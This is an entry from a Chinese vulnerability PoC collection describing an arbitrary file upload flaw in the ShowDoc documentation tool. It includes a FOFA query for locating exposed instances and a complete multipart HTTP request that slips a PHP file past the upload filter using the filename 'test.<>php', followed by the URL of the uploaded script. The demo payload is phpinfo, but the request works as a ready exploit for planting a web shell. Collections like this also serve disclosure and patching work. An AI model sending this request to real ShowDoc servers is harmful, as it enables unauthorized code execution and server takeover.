---

source: "wy876 漏洞文库"
---

# ShowDoc PageController存在任意文件上传漏洞

# 一、漏洞简介
ShowDoc是一个非常适合IT团队的在线文档分享工具，它可以加快团队之间沟通的效率。通过showdoc，你可以方便地使用markdown语法来书写出美观的API文档、数据字典文档、技术文档、在线excel文档等等。ShowDoc系统存在任意文件上传漏洞，攻击者可以通过上传恶意文件执行任意命令，获取服务器管理权限。

# 二、影响版本
+ ShowDoc

# 三、资产测绘
+ fofa`app="ShowDoc"`
+ 特征


# 四、漏洞复现
```rust
POST /index.php?s=/home/page/uploadImg HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0
Content-Length: 241
Content-Type: multipart/form-data; boundary=--------------------------921378126371623762173617
Accept-Encoding: gzip

----------------------------921378126371623762173617
Content-Disposition: form-data; name="editormd-image-file"; filename="test.<>php"
Content-Type: text/plain

<?php phpinfo();?>
----------------------------921378126371623762173617--
```


```rust
http://127.0.0.1:8000/Public/Uploads/2024-05-30/66577ab51bb29.php
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/tw1q4kmr0efcmd8m>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
